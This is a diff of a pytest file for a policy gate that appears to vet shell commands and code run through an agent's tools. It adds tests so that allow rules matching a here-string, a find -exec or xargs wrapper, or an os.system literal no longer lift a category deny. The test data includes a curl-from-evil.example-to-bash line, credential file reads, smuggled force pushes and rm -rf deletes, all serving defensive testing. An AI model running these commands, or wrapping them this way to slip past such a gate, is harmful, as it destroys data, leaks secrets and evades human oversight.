@@ -149,7 +149,9 @@ NESTED = [
     (f"bash <<'EOF'\n{PUSH}\nEOF", "^bash", PUSH, {"categories": OPAQUE_OK}),
     (f"bash -c '{PUSH}'", "^bash -c", PUSH, {"categories": OPAQUE_OK}),
     (f"true; eval '{PUSH}'", "eval", PUSH, {"categories": OPAQUE_OK}),
-    (f"true; xargs {PUSH}", "^true", f"xargs {PUSH}", {"categories": OPAQUE_OK}),
+    (f"true; xargs {PUSH}", "^true", PUSH, {"categories": OPAQUE_OK}),                # #458: was `xargs {PUSH}`
+    (f"true; find . -exec {PUSH} ';'", "^true", PUSH, {"categories": OPAQUE_OK}),
+    (f"true; git bisect run {PUSH}", "^true", PUSH, {"categories": OPAQUE_OK}),
 ]
 
 
@@ -726,6 +728,136 @@ def test_the_own_text_of_what_the_gate_finds_in_code():
     assert outcome(piped, pol(rule("^python3"), categories=OPAQUE_OK)) == "ask"    # main: ask
 
 
+# --- stdin is not own text: a here-string or a here-doc body (#458) ---------------------------------------------------
+# A here-string's word was part of its command's own text, and a line of one command was matched on its whole text, a
+# here-doc body included. So an unanchored allow rule found its text in the stdin and lifted a category deny. Main
+# allowed each line below by the rule, but the last two: a shell reads its stdin as a nested line, whose commands
+# have their own text, so those two were denied on main too and stay denied.
+
+DELETE_DENY = {"delete": "deny"}
+PUSH_DENY = {"force_push": "deny"}
+STDIN_ROWS = [
+    # (line, rules, categories)
+    (f"ls; {PUSH} <<< 'npm test'", [rule("^ls"), rule("npm test")], PUSH_DENY),
+    ("rm -rf build <<< 'npm test'", [rule("npm test")], DELETE_DENY),
+    ("git push <<< 'npm test' --force origin main", [rule("npm test")], PUSH_DENY),
+    ("rm -rf build <<EOF\nnpm test\nEOF", [rule("npm test")], DELETE_DENY),
+    ("rm -rf build <<'EOF'\nnpm test\nEOF", [rule("npm test")], DELETE_DENY),
+    ("rm -rf build <<-EOF\n\tnpm test\n\tEOF", [rule("npm test")], DELETE_DENY),
+    (f"bash <<< 'npm test; {PUSH}'", [rule("npm test")], {**PUSH_DENY, **OPAQUE_OK}),
+    (f"cat <<< 'npm test; {PUSH}' | bash", [rule("npm test")], {**PUSH_DENY, **OPAQUE_OK}),
+]
+
+
+@pytest.mark.parametrize("line, rules, cats", STDIN_ROWS)
+def test_a_rule_that_names_only_stdin_does_not_lift_a_category_deny(line, rules, cats):
+    d = decide(sh(line), pol(*rules, categories=cats))
+    assert (d.outcome, d.rule) == ("deny", "category"), d
+
+
+@pytest.mark.parametrize("line, own", [
+    ("rm -rf build <<< 'npm test'", "rm -rf build"),
+    ("git push <<< 'npm test' --force origin main", "git push --force origin main"),
+    ("cat <<<x >out", "cat >out"),
+    ("rm -rf build <<EOF\nnpm test\nEOF", "rm -rf build <<EOF"),
+])
+def test_a_here_string_is_left_out_of_the_own_text(line, own):
+    assert sh(line).own == own
+    assert [k.own for k in gate._parse(line)[0]] == [own]
+
+
+def test_a_pipeline_text_leaves_its_here_strings_out():
+    line = f"cat <<< 'npm test; {PUSH}' | bash"
+    runs = [p.own for p in gate._each_part(sh(line)) if p.summary == BASH_RUNS]
+    assert runs == ["cat | bash"], runs
+
+
+@pytest.mark.parametrize("line, r, cats, expected", [
+    # a rule that names the command itself still decides it
+    ("rm -rf build <<< 'npm test'", rule("^rm -rf build"), DELETE_DENY, "allow"),
+    ("rm -rf build <<EOF\nnpm test\nEOF", rule("^rm -rf build"), DELETE_DENY, "allow"),
+    (f"ls; {PUSH} <<< 'npm test'", rule(["^ls", "git push --force"]), PUSH_DENY, "allow"),
+    # a `<<` that starts no stdin leaves the line its own text, decided as before
+    ("echo 'a << b'", rule("a << b", "log"), {}, "log"),
+    ("echo $((1 << 2))", rule("1 << 2", "log"), {}, "log"),
+    # a rule that keeps or raises the line still sees the whole line, a deny rule too
+    ("rm -rf build <<< 'npm test'", rule("npm test", "deny"), {}, "deny"),
+])
+def test_a_line_with_stdin_keeps_what_names_its_command(line, r, cats, expected):
+    assert outcome(line, pol(r, categories=cats)) == expected
+
+
+ANCHORED_LIST = rule(["^ls", "^git status", "^rm -rf build$", "^make test$"])
+
+
+@pytest.mark.parametrize("line, cats, expected", [
+    ("ls; rm -rf build <<< 'npm test'", {}, "ask"),
+    ("ls; rm -rf build <<< 'npm test'", DELETE_DENY, "deny"),
+    ("ls; rm -rf build <<< npm\\ test", DELETE_DENY, "deny"),
+    (f"ls; {PUSH} <<< x", PUSH_DENY, "deny"),
+])
+def test_a_rule_that_names_the_command_without_its_here_string_does_not_lower_it(line, cats, expected):
+    # The own text keeps the here-string as its `whole`: a rule must match it too, as before, so an anchored rule for
+    # the bare command does not lower the line. Without that, gate_diff found `ls; rm -rf build <<< 'npm test'`
+    # allowed under this rule list, where main asked or denied.
+    p = pol(ANCHORED_LIST, rule(f"^{PUSH}$"), categories=cats)
+    assert outcome(line, p) == expected                                                        # main: the same
+    own = next(q.own for q in gate._each_part(sh(line)) if q.category in ("delete", "force_push"))
+    assert own.whole == line.split("; ", 1)[1] and own == own.whole.split(" <<<")[0], (own, own.whole)
+
+
+# --- the command find -exec, xargs or git bisect run runs has its own text (#458) ----------------------------------
+# Its parts carried the text of the command that runs it, so a rule written for `^find`, `xargs` or `^git bisect`
+# named them and, under opaque_exec: allow, lifted a category deny on what they run. Main allowed each row.
+
+WRAPPED = [
+    # (line, a rule for the program that runs the command)
+    (f"ls; find . -exec {PUSH} \\;", rule("^ls|^find")),
+    (f"find . -exec {PUSH} \\;", rule("^find")),
+    (f"find . -execdir {PUSH} \\;", rule("^find")),
+    (f"find . -ok {PUSH} \\;", rule("^find")),
+    (f"find . -okdir {PUSH} +", rule("^find")),
+    (f"echo x | xargs {PUSH}", rule("xargs")),
+    (f"echo x | xargs -n1 -I{{}} {PUSH}", rule("xargs")),
+    (f"git bisect run {PUSH}", rule("^git bisect")),
+]
+
+
+@pytest.mark.parametrize("line, r", WRAPPED)
+def test_a_rule_for_the_program_does_not_lower_the_command_it_runs(line, r):
+    for cats in ({**PUSH_DENY, **OPAQUE_OK}, PUSH_DENY):
+        d = decide(sh(line), pol(r, categories=cats))
+        assert (d.outcome, d.rule) == ("deny", "category"), (cats, d)               # main: allow, then ask or deny
+    pushes = [p for p in gate._each_part(sh(line)) if p.category == "force_push"]
+    assert pushes and {p.own for p in pushes} == {PUSH}, [(p.summary, p.own) for p in pushes]
+
+
+@pytest.mark.parametrize("line, r", WRAPPED)
+def test_a_rule_that_names_the_command_it_runs_too_still_allows_it(line, r):
+    both = rule([*r["match"]["command"].split("|"), f"^{PUSH}"])
+    assert outcome(line, pol(both, categories={**PUSH_DENY, **OPAQUE_OK})) == "allow"
+
+
+@pytest.mark.parametrize("line, r", WRAPPED)
+def test_a_rule_that_names_only_the_command_it_runs_does_not_lower_it(line, r):
+    # The program's own text stays the `whole` of the command it runs, so a rule must match that too, as before: an
+    # anchored rule for the bare push does not lower it.
+    p = pol(rule(["^ls", "^echo", f"^{PUSH}$"]), categories={**PUSH_DENY, **OPAQUE_OK})
+    assert outcome(line, p) == "deny"                                                         # main: deny
+
+
+def test_the_program_that_runs_the_command_keeps_its_own_text():
+    line = f"find . -name x -exec {PUSH} \\;"
+    owns = {(p.category, p.own) for p in gate._each_part(sh(line))}
+    assert ("read", line) in owns and ("opaque_exec", line) in owns, owns
+    line = "find . -name '*.pyc' -exec rm -f {} +"
+    assert {p.own for p in gate._each_part(sh(line)) if p.category == "delete"} == {"rm -f {}"}
+    assert outcome(line, pol(rule("^find"), categories={**DELETE_DENY, **OPAQUE_OK})) == "deny"       # main: allow
+    # The delete gets its matrix cell, as when it runs alone, until a rule names it too.
+    assert outcome(line, pol(rule("^find"), categories=OPAQUE_OK)) == outcome("rm -f x", pol()) == "ask"  # main: allow
+    assert outcome(line, pol(rule(["^find", "^rm -f {}$"]), categories=OPAQUE_OK)) == "allow"
+
+
 # --- what stays the same --------------------------------------------------------------------------------------------
 
 SINGLE = [
@@ -759,6 +891,8 @@ ONE_COMMAND = [
     ("cat ~/.kube/config", rule("^cat"), {"categories": CRED_DENY}),
     ("cat ~/.git-credentials", rule("^cat"), {"categories": CRED_DENY}),
     ("~/.aws/credentials", rule("ls", "log"), {"matrix": ALL_DENY}),
+]
+LITERAL_COMMAND = [
     (GH_IN_NODE, rule(".", "log"), {"categories": MANY_DENY}),
     ("perl -e \"system('gh pr comment 3')\"", rule(".", "log"), {"categories": MANY_DENY}),
     ("ruby -e \"system('gh pr comment 3')\"", rule(".", "log"), {"categories": MANY_DENY}),
@@ -767,10 +901,10 @@ ONE_COMMAND = [
 
 
 @pytest.mark.parametrize("line, r, gates", ONE_COMMAND)
-def test_a_line_of_one_command_beside_parts_the_gate_made_is_decided_as_before(line, r, gates):
-    # A secret path the command names and a string literal in its code are parts the gate makes, with no own text,
-    # and the secret or the literal decides the line. Every other part has the command's text, so a rule that matches
-    # the line names that one command: the line is decided as on main, reason and all. It was denied.
+def test_a_line_of_one_command_beside_a_secret_it_names_is_decided_as_before(line, r, gates):
+    # A secret path the command names is a part the gate makes, with no own text, and the secret decides the line.
+    # Every other part has the command's text, so a rule that matches the line names that one command: the line is
+    # decided as on main, reason and all. It was denied.
     c, policies = sh(line), pol(r, **gates)
     assert c.parts and c.own is None, c
     d = decide(c, policies)
@@ -780,14 +914,72 @@ def test_a_line_of_one_command_beside_parts_the_gate_made_is_decided_as_before(l
     assert outcome(f"true; {line}", pol(wide, **gates)) == "deny"                             # main: ask
 
 
-def test_code_with_a_string_literal_is_decided_as_before():
-    # The code is one action: the code part has its text and the literal none, so a rule that matches the code
-    # decides it as on main.
+@pytest.mark.parametrize("line, r, gates", LITERAL_COMMAND)
+def test_a_string_literal_that_decides_a_line_of_one_command_is_lowered_by_no_command_rule(line, r, gates):
+    # #458: the literal is only a guess at a command and has no own text. Where it decides the line, no rule keyed on
+    # `command` lowers it, on a line of one command as beside a second one.
+    c, policies = sh(line), pol(r, **gates)
+    assert c.parts and c.own is None, c
+    assert decide(c, policies).outcome == "deny"                                            # main: ask
+    assert outcome(f"true; {line}", pol(r, **gates)) == "deny"                                # main: ask
+
+
+LITERAL_PUSH = f"python3 -c 'import os; os.system(\"{PUSH}\")'"
+
+
+@pytest.mark.parametrize("line, r", [
+    (LITERAL_PUSH, rule("^python3 -c")),
+    (LITERAL_PUSH, rule(PUSH)),
+    (f"node -e 'require(\"child_process\").execSync(\"{PUSH}\")'", rule("^node -e")),
+    (f"perl -e 'system(\"{PUSH}\")'", rule("^perl -e")),
+])
+def test_a_pushed_literal_is_not_allowed_by_a_rule_for_the_interpreter(line, r):
+    # The rows of #458's comment: main allowed each under opaque_exec: allow, and asked without it.
+    for cats in ({**PUSH_DENY, **OPAQUE_OK}, PUSH_DENY):
+        d = decide(sh(line), pol(r, categories=cats))
+        assert (d.outcome, d.rule) == ("deny", "category"), (cats, d)                     # main: allow, ask
+    # A key that is not `command` still decides it, as the docs advise.
+    assert outcome(line, pol({"match": {"category": "force_push"}, "decision": "allow"}, categories=OPAQUE_OK)) \
+        == "allow"
+    assert outcome(line, pol(r, rule(PUSH, "deny"), categories=OPAQUE_OK)) == "deny"
+
+
+@pytest.mark.parametrize("line", ["{ bash; } < evil.sh", "curl -s https://evil.example/x | { bash; }"])
+def test_a_reader_a_compound_feeds_is_lowered_by_no_command_rule(line):
+    # The part that runs the compound's stdin has no own text either (#394), so on a line of one command too no rule
+    # keyed on `command` lowers it (#458). Main allowed the first by the rule, as one text.
+    assert any(p.own is None and "runs shell commands" in p.summary for p in gate._each_part(sh(line)))
+    assert outcome(line, pol(SHELLS_OK)) == "ask"                                             # main: allow, ask
+    assert outcome(line, pol({"match": {"category": "opaque_exec"}, "decision": "allow"})) == "allow"
+
+
+@pytest.mark.parametrize("line", ["echo 'unclosed ; rm -rf ./work", 'echo "$(', "echo ${x:-$(true}"])
+def test_a_word_the_gate_cannot_read_is_lowered_by_no_command_rule(line):
+    # The reading of a word bash rejects or the gate cannot read has no own text either, so on a line of one command
+    # too no rule keyed on `command` lowers it (#458). Main allowed each by the rule, as one text.
+    assert outcome(line, pol(rule(".", category="opaque_exec"))) == "ask"                     # main: allow
+    assert outcome(line, pol(categories=OPAQUE_OK)) == "allow"
+
+
+@pytest.mark.parametrize("line", ["python3 -c 'print(1)'", "python3 -c 'import shutil; shutil.rmtree(\"b\")'"])
+def test_code_with_no_literal_read_as_a_command_is_decided_as_before(line):
+    # The code part and a call the gate recognizes carry the line's text, so the rule names them, as on main.
+    c, p = sh(line), pol(rule("^python3 -c"), categories={**DELETE_DENY, **OPAQUE_OK})
+    assert gate._one_text(c)
+    assert decide(c, p) == gate._decide(c, p, {}, None)
+    assert decide(c, p).outcome == "allow"                                                  # main: allow
+
+
+def test_code_with_a_string_literal_that_decides_it_is_lowered_by_no_command_rule():
+    # The code is one action, but the literal is only a guess at a command with no own text, so a rule that matches
+    # the code does not lower what the literal decides (#458). Main allowed it by either rule.
     c = classify({"tool": "execute_code", "args": {"code": f"import os\nos.system('{PUSH}')"}})
     assert c.category == "force_push" and c.own is None, c
-    assert decide(c, pol(PUSH_OK, categories=OPAQUE_OK)).outcome == "allow"                    # main: allow
-    assert decide(c, pol(rule("os\\.system"), categories=OPAQUE_OK)).outcome == "allow"       # main: allow
+    assert decide(c, pol(PUSH_OK, categories=OPAQUE_OK)).outcome == "ask"                      # main: allow
+    assert decide(c, pol(rule("os\\.system"), categories=OPAQUE_OK)).outcome == "ask"         # main: allow
     assert decide(c, pol(rule(PUSH, "deny"), categories=OPAQUE_OK)).outcome == "deny"
+    assert decide(c, pol({"match": {"tool": "execute_code"}, "decision": "allow"}, categories=OPAQUE_OK)).outcome \
+        == "allow"
 
 
 SETTER_LITERALS = ["export X=1", "coproc cat", "for x in a; do true; done", "read x"]
@@ -796,15 +988,20 @@ SETTER_LITERALS = ["export X=1", "coproc cat", "for x in a; do true; done", "rea
 @pytest.mark.parametrize("setter", SETTER_LITERALS)
 def test_a_literal_that_sets_shell_state_leaves_code_decided_as_before(setter):
     # A literal's setters run in the shell the code starts, not in the line around it, and the literal has no own
-    # text. So code whose literal sets shell state is still one text, decided as on main.
+    # text. So code whose literal only sets shell state is still one text, decided as on main.
+    code = f'import os\nos.system("{setter}")\nos.system("ls")'
+    c = classify({"tool": "execute_code", "args": {"code": code}})
+    assert not [t for p in gate._each_part(c) for t in p.setters], c
+    p = pol(rule("os\\.system"), categories=OPAQUE_OK)
+    assert gate._one_text(c) and decide(c, p).outcome == "allow"                              # main: allow
+    # A literal that pushes as well decides the line, and no rule keyed on `command` lowers it (#458).
     code = f'import os\nos.system("{setter}; {PUSH}")'
     c = classify({"tool": "execute_code", "args": {"code": code}})
     assert not [t for p in gate._each_part(c) for t in p.setters], c
-    assert decide(c, pol(rule("os\\.system"), categories=OPAQUE_OK)).outcome == "allow"       # main: allow
+    assert decide(c, p).outcome == "ask"                                                      # main: allow
     py = f"python3 -c 'import os; os.system(\"{setter}; {PUSH}\")'"
-    assert outcome(py, pol(rule("os\\.system"), categories=OPAQUE_OK)) == "allow"              # main: allow
-    # After a second command the own text test applies: the literal has no own text to name.
-    assert outcome(f"true; {py}", pol(rule("os\\.system"), categories=OPAQUE_OK)) == "ask"     # main: allow
+    assert outcome(py, p) == "ask"                                                            # main: allow
+    assert outcome(f"true; {py}", p) == "ask"                                                 # main: ask
 
 
 # No link leads the write elsewhere, on any system. On macOS `/tmp` is a link to `/private/tmp`, and a write through a
@@ -818,6 +1015,8 @@ CODE = {"tool": "execute_code", "args": {"code": "print(1)"}}
     (WRITE, rule("^$", "log"), {}, "log"),             # no shell text: a command regex sees the empty string
     (WRITE, rule("x", "log"), {}, "allow"),
     (WRITE, {"match": {"tool": "write_file"}, "decision": "log"}, {}, "log"),
+    (WRITE, rule(".*"), {"categories": {"local_write": "deny"}}, "allow"),    # #458: no own text at all, as before
+    (WRITE, rule(".*"), {"categories": {"local_write": "ask"}}, "allow"),
     (FETCH, rule("^$", "deny"), {}, "deny"),
     (FETCH, rule("^$", "log"), {}, "log"),
     (CODE, rule("print", "log", category="code"), {"categories": OPAQUE_OK}, "log"),
